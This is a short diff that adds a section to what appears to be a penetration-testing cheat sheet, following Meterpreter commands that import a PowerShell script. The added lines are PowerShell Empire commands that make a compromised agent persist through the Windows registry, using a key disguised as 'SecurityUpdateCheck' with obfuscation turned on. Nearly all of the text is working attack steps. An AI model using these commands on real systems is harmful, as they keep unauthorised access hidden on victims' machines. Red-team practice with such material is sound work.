@@ -269,3 +269,15 @@ go to meterpreter and run:
 load powershell
 powershell_import /path/to/file/created.ps1
 ```
+
+### Empire Registry Persistence
+
+```
+usemodule powershell/persistence/userland/registry
+set Agent <AGENT_ID>
+set Listener http
+set KeyName SecurityUpdateCheck
+set RegPath HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\GameDVR\\SecurityDebugCheck
+set Obfuscate True
+```
+
